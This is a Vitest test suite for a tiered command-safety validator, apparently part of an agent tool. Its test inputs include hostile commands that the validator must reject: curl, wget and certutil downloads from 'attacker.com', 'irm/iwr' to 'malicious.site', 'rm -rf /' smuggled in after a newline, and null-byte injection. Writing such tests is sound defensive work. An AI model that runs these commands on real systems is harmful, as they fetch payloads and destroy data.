import { describe, it, expect } from 'vitest';
import { securityService, SecurityViolationException } from '../src/main/services/security.service';

describe('Phase 6.1: Permission Tier Adversarial Verification Suite', () => {
  describe('1. Restricted Tier: Shell Command Safety & Bypass Attempts', () => {
    it('allows benign read-only directory and file listing commands', () => {
      expect(securityService.isReadOnlyCommand('dir')).toBe(true);
      expect(securityService.isReadOnlyCommand('ls')).toBe(true);
      expect(securityService.isReadOnlyCommand('pwd')).toBe(true);
      expect(securityService.isReadOnlyCommand('Get-Location')).toBe(true);
      expect(securityService.isReadOnlyCommand('gl')).toBe(true);
      expect(securityService.isReadOnlyCommand('Get-ChildItem')).toBe(true);
      expect(securityService.isReadOnlyCommand('gci')).toBe(true);
    });

    it('allows benign read-only file content viewers', () => {
      expect(securityService.isReadOnlyCommand('cat src/index.ts')).toBe(true);
      expect(securityService.isReadOnlyCommand('type README.md')).toBe(true);
      expect(securityService.isReadOnlyCommand('Get-Content package.json')).toBe(true);
      expect(securityService.isReadOnlyCommand('gc package.json')).toBe(true);
      expect(securityService.isReadOnlyCommand('head -n 20 file.txt')).toBe(true);
      expect(securityService.isReadOnlyCommand('tail -f file.txt')).toBe(true);
      expect(securityService.isReadOnlyCommand('more file.txt')).toBe(true);
      expect(securityService.isReadOnlyCommand('less file.txt')).toBe(true);
    });

    it('allows benign environment and version inspection', () => {
      expect(securityService.isReadOnlyCommand('whoami')).toBe(true);
      expect(securityService.isReadOnlyCommand('hostname')).toBe(true);
      expect(securityService.isReadOnlyCommand('date')).toBe(true);
      expect(securityService.isReadOnlyCommand('which node')).toBe(true);
      expect(securityService.isReadOnlyCommand('node -v')).toBe(true);
      expect(securityService.isReadOnlyCommand('npm --version')).toBe(true);
      expect(securityService.isReadOnlyCommand('python -V')).toBe(true);
      expect(securityService.isReadOnlyCommand('git --version')).toBe(true);
    });

    it('allows git status, log, diff, show, and pure listing commands', () => {
      expect(securityService.isReadOnlyCommand('git status')).toBe(true);
      expect(securityService.isReadOnlyCommand('git log -n 5')).toBe(true);
      expect(securityService.isReadOnlyCommand('git diff HEAD')).toBe(true);
      expect(securityService.isReadOnlyCommand('git show')).toBe(true);
      expect(securityService.isReadOnlyCommand('git branch')).toBe(true);
      expect(securityService.isReadOnlyCommand('git branch -a')).toBe(true);
      expect(securityService.isReadOnlyCommand('git branch -r')).toBe(true);
      expect(securityService.isReadOnlyCommand('git tag')).toBe(true);
    });

    it('blocks git write operations disguised under branch or tag subcommands', () => {
      // Branch creation
      expect(securityService.isReadOnlyCommand('git branch new-feature-branch')).toBe(false);
      // Branch deletion
      expect(securityService.isReadOnlyCommand('git branch -d old-branch')).toBe(false);
      expect(securityService.isReadOnlyCommand('git branch -D old-branch')).toBe(false);
      expect(securityService.isReadOnlyCommand('git branch --delete old-branch')).toBe(false);
      // Branch rename
      expect(securityService.isReadOnlyCommand('git branch -m old new')).toBe(false);
      // Tag creation
      expect(securityService.isReadOnlyCommand('git tag v1.0.0')).toBe(false);
      expect(securityService.isReadOnlyCommand('git tag -a v1.0.0 -m release')).toBe(false);
      expect(securityService.isReadOnlyCommand('git tag -d v1.0.0')).toBe(false);
    });

    it('blocks destructive git commands (push, commit, checkout, reset, clean, rm, merge, rebase)', () => {
      expect(securityService.isReadOnlyCommand('git push origin master')).toBe(false);
      expect(securityService.isReadOnlyCommand('git commit -m "hack"')).toBe(false);
      expect(securityService.isReadOnlyCommand('git checkout -b hack')).toBe(false);
      expect(securityService.isReadOnlyCommand('git reset --hard HEAD~1')).toBe(false);
      expect(securityService.isReadOnlyCommand('git clean -fd')).toBe(false);
      expect(securityService.isReadOnlyCommand('git rm -rf .')).toBe(false);
      expect(securityService.isReadOnlyCommand('git merge feature')).toBe(false);
      expect(securityService.isReadOnlyCommand('git rebase main')).toBe(false);
    });

    it('blocks PowerShell write and destructive aliases', () => {
      expect(securityService.isReadOnlyCommand('del file.txt')).toBe(false);
      expect(securityService.isReadOnlyCommand('rm file.txt')).toBe(false);
      expect(securityService.isReadOnlyCommand('ri file.txt')).toBe(false);
      expect(securityService.isReadOnlyCommand('sc file.txt "data"')).toBe(false);
      expect(securityService.isReadOnlyCommand('set-content file.txt "data"')).toBe(false);
      expect(securityService.isReadOnlyCommand('ac file.txt "data"')).toBe(false);
      expect(securityService.isReadOnlyCommand('add-content file.txt "data"')).toBe(false);
      expect(securityService.isReadOnlyCommand('ni file.txt -ItemType File')).toBe(false);
      expect(securityService.isReadOnlyCommand('new-item file.txt')).toBe(false);
      expect(securityService.isReadOnlyCommand('mkdir new_folder')).toBe(false);
      expect(securityService.isReadOnlyCommand('md new_folder')).toBe(false);
      expect(securityService.isReadOnlyCommand('kill 1234')).toBe(false);
      expect(securityService.isReadOnlyCommand('saps calc.exe')).toBe(false);
      expect(securityService.isReadOnlyCommand('start-process calc.exe')).toBe(false);
      expect(securityService.isReadOnlyCommand('iex "echo bad"')).toBe(false);
      expect(securityService.isReadOnlyCommand('invoke-expression "echo bad"')).toBe(false);
      expect(securityService.isReadOnlyCommand('irm https://malicious.site')).toBe(false);
      expect(securityService.isReadOnlyCommand('iwr https://malicious.site')).toBe(false);
    });

    it('blocks command chaining operators (&&, ;, ||, &, |)', () => {
      expect(securityService.isReadOnlyCommand('dir && del file.txt')).toBe(false);
      expect(securityService.isReadOnlyCommand('ls ; rm file.txt')).toBe(false);
      expect(securityService.isReadOnlyCommand('dir || echo fallback')).toBe(false);
      expect(securityService.isReadOnlyCommand('cat file.txt | rm')).toBe(false);
      expect(securityService.isReadOnlyCommand('echo hello & calc.exe')).toBe(false);
    });

    it('blocks shell redirection (>, >>, <, 2>&1)', () => {
      expect(securityService.isReadOnlyCommand('echo pwned > pwn.txt')).toBe(false);
      expect(securityService.isReadOnlyCommand('type file.txt >> appended.txt')).toBe(false);
      expect(securityService.isReadOnlyCommand('cat < input.txt')).toBe(false);
    });

    it('blocks command substitution and subshells ($(), ``, $env:)', () => {
      expect(securityService.isReadOnlyCommand('echo $(whoami)')).toBe(false);
      expect(securityService.isReadOnlyCommand('echo `whoami`')).toBe(false);
      expect(securityService.isReadOnlyCommand('echo $env:TEMP')).toBe(false);
    });

    it('blocks indirect execution via runtimes and scripts (python -c, node -e, powershell -c, cmd /c)', () => {
      expect(securityService.isReadOnlyCommand('python -c "import os; os.system(\'calc\')\"')).toBe(false);
      expect(securityService.isReadOnlyCommand('node -e "console.log(process.env)"')).toBe(false);
      expect(securityService.isReadOnlyCommand('powershell -Command "Remove-Item foo"')).toBe(false);
      expect(securityService.isReadOnlyCommand('cmd.exe /c "del foo"')).toBe(false);
      expect(securityService.isReadOnlyCommand('./malicious.sh')).toBe(false);
      expect(securityService.isReadOnlyCommand('.\\script.ps1')).toBe(false);
    });

    it('blocks network/download write tools (curl -o, wget -O, certutil)', () => {
      expect(securityService.isReadOnlyCommand('curl -o payload.exe http://attacker.com')).toBe(false);
      expect(securityService.isReadOnlyCommand('wget -O payload.exe http://attacker.com')).toBe(false);
      expect(securityService.isReadOnlyCommand('certutil -urlcache -f http://attacker.com payload.exe')).toBe(false);
    });
  });

  describe('2. Standard Tier: Compound Commands & Multi-Line Injection Prevention', () => {
    it('allows benign single commands in standard tier', () => {
      expect(() => {
        securityService.validateCommandSafety('npm test', 'standard');
      }).not.toThrow();

      expect(() => {
        securityService.validateCommandSafety('git commit -m "feat: standard work"', 'standard');
      }).not.toThrow();

      expect(() => {
        securityService.validateCommandSafety('node build.js --prod', 'standard');
      }).not.toThrow();
    });

    it('blocks chaining, piping, redirection, and subshells in standard tier', () => {
      expect(() => {
        securityService.validateCommandSafety('npm run build && npm run deploy', 'standard');
      }).toThrow(SecurityViolationException);

      expect(() => {
        securityService.validateCommandSafety('cat list.txt | grep target', 'standard');
      }).toThrow(SecurityViolationException);

      expect(() => {
        securityService.validateCommandSafety('npm test > output.log', 'standard');
      }).toThrow(SecurityViolationException);

      expect(() => {
        securityService.validateCommandSafety('echo `id`', 'standard');
      }).toThrow(SecurityViolationException);

      expect(() => {
        securityService.validateCommandSafety('npm run $(echo test)', 'standard');
      }).toThrow(SecurityViolationException);
    });

    it('blocks multi-line command injection (\r and \n) in standard tier', () => {
      expect(() => {
        securityService.validateCommandSafety('npm test\nrm -rf /', 'standard');
      }).toThrow(/dangerous shell operator or multi-line characters/i);

      expect(() => {
        securityService.validateCommandSafety('npm test\r\ndel /f *', 'standard');
      }).toThrow(/dangerous shell operator or multi-line characters/i);
    });

    it('blocks subshell parentheses grouping in standard tier', () => {
      expect(() => {
        securityService.validateCommandSafety('(npm test)', 'standard');
      }).toThrow(/dangerous shell operator or multi-line characters/i);
    });

    it('blocks null-byte injection in command strings', () => {
      expect(() => {
        securityService.validateCommandSafety('npm test\0; calc.exe', 'standard');
      }).toThrow(SecurityViolationException);
    });
  });

  describe('3. Full Access Tier: Unrestricted Command Execution', () => {
    it('allows compound commands and complex shell workflows under full tier', () => {
      expect(() => {
        securityService.validateCommandSafety('npm run build && npm test && git push origin main', 'full');
      }).not.toThrow();

      expect(() => {
        securityService.validateCommandSafety('cat log.txt | grep ERROR > errors.log', 'full');
      }).not.toThrow();
    });
  });
});
